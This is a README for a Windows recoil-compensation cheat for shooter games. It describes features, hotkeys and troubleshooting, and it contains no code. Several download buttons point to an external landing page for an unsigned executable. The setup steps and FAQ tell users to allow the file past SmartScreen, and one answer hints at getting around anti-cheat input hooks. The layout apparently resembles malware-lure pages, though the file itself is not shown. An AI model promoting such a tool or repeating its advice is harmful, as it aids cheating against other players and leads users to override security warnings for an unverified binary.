<div align="center">

<img src="assets/banner.svg" width="100%" alt="Rust Recoil Script banner"/>

# rust-recoil-script 🎯🦀

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Recoil compensation, tuned like a solo dev tunes their own aim — fast, quiet, and done by the time you'd finish reading the docs.*

<p align="center">
  <a href="https://HairdresserBurn.github.io/rust-recoil-script/">
    <img src="https://img.shields.io/badge/GET-Rust_Recoil_Script_2026-D97706?style=for-the-badge&logo=windows&logoColor=white&labelColor=B45309" width="550" alt="Download"/>
  </a>
</p>
</div>

## 🧭 Overview

This started as a personal itch. Recoil patterns in modern shooters are basically tiny math puzzles disguised as gunplay — vertical climb, horizontal drift, a curve that resets on release. Every weapon has its own signature, and every signature is learnable, but nobody wants to spend three weekends charting pixel offsets by hand. So a solo dev sat down, opened a blank Rust project, and started measuring.

**rust-recoil-script** is the result: a lightweight, standalone Windows utility that reads weapon recoil curves and counters them with precise, low-latency cursor compensation. No bloated launcher, no background telemetry, no fifteen-tab settings menu pretending to be "advanced." It's a single focused tool built around one job — smoothing out the mechanical part of recoil so you can spend your attention on positioning, timing, and decision-making instead of fighting a spreadsheet's worth of vertical climb.

It exists for people who want their tools to behave like tools: predictable, transparent, and fast to configure. Competitive players tuning per-weapon profiles, casual players who just want combat to feel less like arm-wrestling their mouse, and tinkerers who enjoy reading a clean Rust codebase all land here for the same reason — the script does exactly what it says, and nothing else.

<p align="center">

<a href="https://HairdresserBurn.github.io/rust-recoil-script/">
    <img src="https://img.shields.io/badge/GET-Rust_Recoil_Script_2026-D97706?style=for-the-badge&logo=windows&logoColor=white&labelColor=B45309" width="550" alt="Download"/>
  </a>

</p>

---

## ⚙️ What It Actually Does

> [!NOTE]
> Every capability below runs locally. Nothing phones home, nothing needs an account.

- **Per-weapon curve profiles** — each gun gets its own compensation shape instead of one generic "recoil slider" pretending to fit everything.

- **Adaptive vertical + horizontal correction** — most tools only fight the vertical climb. This one tracks drift too, because real spray patterns rarely travel in a straight line.

- **Sub-millisecond input pacing** — built in Rust specifically because garbage collection pauses have no business existing inside a timing-sensitive loop.

- **Live profile switching** — swap weapon profiles mid-session with a hotkey instead of digging through menus between rounds.

- **Sensitivity-aware scaling** — compensation math adjusts to your DPI and in-game sensitivity automatically, so a config that feels right at one sensitivity still feels right at another.

- **Zero-footprint runtime** — one executable, no installer scattering files across your system, no service running when you're not.

- **Visual curve editor** — draw or fine-tune a recoil pattern by hand if the presets don't match your loadout exactly.

- **Config import/export** — share a profile as a single small file, drop it into a friend's setup in seconds.

## 🚀 Getting Started

1. Visit the landing page using the download button above.

2. Grab the latest standalone build — no bundled installer, just the executable.

3. Run it. Windows may show a SmartScreen prompt for unsigned apps — that's normal for small independent projects.

4. Pick a weapon profile, drop into a match, and let the curve do the boring part.

> [!TIP]
> Start with the closest preset to your weapon and nudge the curve editor by small amounts. Big jumps feel worse than no compensation at all.

## 💻 System Requirements

| Requirement | Minimum |
|---|---|
| OS | Windows 10 (64-bit) |
| OS | Windows 11 (64-bit) |
| Dependencies | None — fully standalone |
| Disk space | Under 20 MB |
| RAM | Negligible, sub-50MB footprint |
| Install | Not required, portable executable |

![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen) ![Built%20With](https://img.shields.io/badge/built%20with-Rust-orange?logo=rust) ![Footprint](https://img.shields.io/badge/footprint-lightweight-lightgrey)

## 🔩 How It Works

The pipeline is short on purpose — fewer moving parts means fewer things that drift out of sync with your actual aim.

1. **Capture** — the tool listens for weapon-specific input events (fire start, held duration).

2. **Lookup** — it matches the active profile's stored recoil curve for that weapon.

3. **Compute** — a small Rust routine calculates the offset needed for the current tick, scaled to your sensitivity.

4. **Apply** — a smoothed cursor correction is issued, sub-frame, so it blends into your own micro-adjustments instead of fighting them.

5. **Reset** — on trigger release, state resets instantly, ready for the next burst.

```mermaid
flowchart LR
Capture --> Lookup
Lookup --> Compute
Compute --> Apply
Apply --> Reset
```

> [!IMPORTANT]
> The curve engine is deterministic — same profile, same input, same output, every single time. No hidden randomness pretending to be "humanization."

## 🧩 Troubleshooting

**Q: The compensation feels too strong on one weapon but fine on others.**
A: Recoil curves aren't universal — open the curve editor and scale that specific profile down instead of adjusting a global setting.

**Q: Windows flagged the executable on first run.**
A: Expected for unsigned indie tools. Verify you downloaded from the linked landing page and allow it through SmartScreen.

**Q: Hotkeys aren't registering in-game.**
A: Some games with anti-cheat-adjacent input hooks can swallow simulated input at the OS level — try running the script before launching the game.

**Q: My sensitivity change made every profile feel off.**
A: That's expected — sensitivity-aware scaling recalculates automatically, but extreme sensitivity jumps may still need a manual profile touch-up.

**Q: Can I use this on a laptop with a touchpad setup?**
A: Technically yes, but recoil curves are tuned around consistent mouse movement — touchpad input introduces noise the curve wasn't designed for.

**Q: The app closes immediately after opening.**
A: Check you're running the 64-bit build on a 64-bit Windows install — that mismatch is the most common cause.

## 🎨 UI / UX Notes

<details>
<summary><strong>Keyboard shortcuts</strong></summary>

| Action | Shortcut |
|---|---|
| Toggle script on/off | F6 |
| Cycle weapon profile | F7 |
| Open curve editor | F8 |
| Save current profile | Ctrl + S |
| Reset profile to default | Ctrl + R |

</details>

<details>
<summary><strong>Themes and appearance</strong></summary>

- Dark theme by default, because most players run their games in dark rooms.

- Optional light theme for streaming overlays where contrast matters.

- Minimal window chrome — the whole UI fits in a corner without stealing screen real estate.

</details>

<details>
<summary><strong>Settings philosophy</strong></summary>

Every setting has a visible default and a one-click reset. Nothing is buried three submenus deep — if it matters enough to configure, it's on the main screen.

</details>

## 🤝 Contributing & Community

This is still very much a solo-dev-shipped project, but issues, curve profile suggestions, and pull requests are genuinely welcome.

- Found a weapon curve that feels off? Open an issue with the weapon name and what's wrong.

- Want to contribute a profile? PRs with new curve data are the fastest way in.

- Have a UI idea? Sketch it, describe it, or just describe the friction — mockups aren't required.

> [!TIP]
> Small, focused PRs get reviewed faster than giant ones. One profile or one fix per PR beats a bundle of five.

---

## 📄 License

Released under the [MIT License](LICENSE), 2026. Use it, fork it, learn from it — just keep the license notice intact.

## ⚠️ Disclaimer

This project is provided as-is, for educational and personal-use purposes around understanding and compensating for recoil mechanics. It does not modify game files, read game memory, or interact with anti-cheat systems. Always check the rules of the game or platform you're playing on — the responsibility for how this tool is used rests entirely with the user.

---

<p align="center">

<a href="https://HairdresserBurn.github.io/rust-recoil-script/">
    <img src="https://img.shields.io/badge/GET-Rust_Recoil_Script_2026-D97706?style=for-the-badge&logo=windows&logoColor=white&labelColor=B45309" width="550" alt="Download"/>
  </a>

</p>